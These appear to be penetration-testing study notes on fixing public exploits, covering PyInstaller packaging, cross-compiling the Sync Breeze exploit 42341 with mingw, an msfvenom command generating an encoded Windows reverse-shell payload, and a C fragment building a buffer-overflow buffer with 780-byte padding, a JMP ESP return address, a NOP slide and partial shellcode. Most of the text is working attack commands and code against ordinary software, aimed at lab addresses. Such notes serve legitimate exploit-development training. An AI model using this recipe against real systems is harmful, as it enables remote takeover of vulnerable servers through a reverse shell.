# Exploit Fixing

## Python Installer

* No cross compilation
* Bundles pyhton program for the platform with dependencies 

```bash
pip install -U pyinstaller
pyinstaller your-program.py
```

## Cross-Compilation

* Compile Windows Programs on Linux 

* compiler
* input file
* -o output file
* -l link libraries e.g. windows sock

```bash
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

# not working on kali arm64 apple
#sudo dpkg --add-architecture i386
#sudo apt update
#sudo apt install winehq-stable
#wine syncbreeze_exploit.exe
```

Compile with GCC

```bash
gcc linux-42341.c syncbreeze
./syncbreeze 
```

## Fix Buffer Overrun Exploit

Always create SHELL CODE and don't trust existing shell code

* -e x86 encoder
* -f c source output
* -b, bad-chars list to avoid "\x00\x0a\x0d\x25\x26\x2b\x3d"

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

Fix exploit Sync Breeze

* rewrite socket connection from windows to linux!
* set target IP and PORT
* add 780+1 (null terminator)
* ret override with JMP ESP (exended stack pointer)
* set NOP SLIDE + SHELLCODE

```c
#define TARGET_IP "192.168.205.10"
#define TARGET_PORT 80

int initial_buffer_size = 780+1;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    // unsigned char retn[] = "\xcb\x75\x52\x73";  //msvbvm60.dll not present
    unsigned char retn[] = "\x83\x0c\x09\x10";   // 0x10090c83 JMP ESP in DLL
    unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
    "\xdb\xc9\xbf\x69\xf5\x12\xbb\xd9\x74\x24\xf4\x5b\x33\xc9" // shellcode
    "\xb1\x52\x31\x7b\x17\x03\x7b\x17\x83\xaa\xf1\xf0\x4e\xd0"
    ....
    "\x45\x87\xbe\x32\x40\xc3\x78\xaf\x38\x5c\xed\xcf\xef\x5d"
    "\x24";
```
